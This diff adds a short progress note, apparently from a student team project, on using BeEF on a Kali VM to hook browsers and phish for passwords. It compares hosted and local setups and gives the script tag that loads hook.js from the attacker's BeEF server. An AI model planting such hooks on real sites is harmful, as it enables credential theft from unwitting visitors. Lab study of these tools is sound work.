@@ -1,0 +1,27 @@
+11/18/2022
+
+I am experimenting with BeEF on a kali linux virtual machine for hooking a victim's browser to phish for passwords. 
+
+I have experimented with Linode, which is a server host that is built around using BeEF.
+Pros: Website can be accessed anywhere by anyone to hook any browser.  
+Cons: I haven'f found a way to change the website that has the hook, and it kinda sucks.
+
+If I can change the default html page linode uses then we can use our website to hook browsers. Otherwise we will need to use the default one.
+
+I have also experimented with using BeEF locally with BeEF-xss and apache2. 
+Pros: Can place the hook script into any html file inside the /var/www/html directory.
+Cons: Website with hook can only be accessed on the local network. (Need to research a work around...)
+
+Since our machines will be using the same network, the con may not be a factor. We will need to place the script into the html file and done.
+
+script (local on my VM): <script src="http://<IP>:3000/hook.js> 
+Replace <IP> with ip address.
+
+I am planning to use BeEF instead of remote controlling the victim's PC since its easier to use and is effective at Phishing. 
+I am confident that this will not change what y'all need to do at all. :)
+
+I will do more research and experimenting tomorrow (11/19/2022). 
+
+For questions: 
+Our Discord: https://discord.gg/wPFnskss
+Email: MatthewWilson10@my.unt.edu
